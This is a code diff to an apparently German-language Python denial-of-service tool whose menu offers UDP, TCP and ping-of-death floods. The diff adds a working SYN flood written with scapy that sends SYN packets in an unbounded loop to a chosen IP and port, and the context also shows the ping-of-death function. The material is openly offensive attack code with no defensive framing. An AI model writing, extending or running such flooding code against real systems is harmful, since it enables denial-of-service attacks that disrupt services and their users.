@@ -18,6 +18,7 @@ print("Bitte wählen Sie eine Angriffsmethode:")
 print("1 - UDP Flood")
 print("2 - TCP Flood")
 print("3 - POD Flood")
+print("4 - SYN Flood")
 
 # Auswahl der Methode
 method = input("Wähle die Angriffsmethode (1/2/3): ")
@@ -67,3 +68,16 @@ def ping_of_death(ip):
             subprocess.run(["ping", "-s", "65507", ip], check=True)
     except KeyboardInterrupt:
         print("Ping of Death beendet.")
+        
+from scapy.all import *
+#SYN Flood
+def syn_flood(ip, port):
+    print("Starte SYN-Flood...")
+    try:
+        while True:
+            ip_layer = IP(dst=ip)
+            tcp_layer = TCP(sport=RandShort(), dport=port, flags="S")
+            packet = ip_layer / tcp_layer
+            send(packet, verbose=False)
+    except KeyboardInterrupt:
+        print("SYN-Flood beendet.")
